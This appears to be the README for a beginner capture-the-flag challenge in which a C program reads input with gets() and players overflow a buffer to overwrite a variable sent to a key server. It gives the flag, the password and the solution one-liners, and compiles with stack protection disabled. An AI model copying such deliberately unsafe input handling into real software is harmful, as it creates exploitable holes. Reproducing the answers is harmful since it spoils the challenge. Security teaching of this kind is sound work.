Name: Simple Buffer Overflow

Description: The user will be presented with a C program that takes input using gets(). Their objective will be to overflow the buffer so that they will overwrite the data contained by the variable named "keyRequest".
The "keyRequest" variable will then be sent to a server via a socket. The server will then check to see if the keyRequest is correct. If it is correct, the key will be transmitted back to the user.
Otherwise, the message "Nope." will be displayed. The correct password is "MOSS".

NOTE: Server code is also included in the repository. This will be running on the server during the even itself. ALSO, we will need to edit the buff.c source code to match the hostname and the port of the server.

Key: aSByZWFsbHkgaG9wZSBsaWZlIGdldHMgZWFzaWVyLi4u

Solution: One way to solve this would be to use a scripting language to overflow the buffer. Example solutions: 

For 32 bit: python -c 'print "A"*80 + "MOSS"' | ./buff
For 64 bit: python -c 'print "A"*88 + "MOSS"' | ./buff

To compile: We have to disable the overflow protection. During testing I had compiled using the following command:
 gcc -Wall -fno-stack-protector -D_FORTIFY_SOURCE=0 buff.c -o buff
 
 listener.c
 gcc -Wall -D_FORTIFY_SOURCE=0 listener.c -o listener
 
 Note: You may want to use -g compiler flag to debug the code.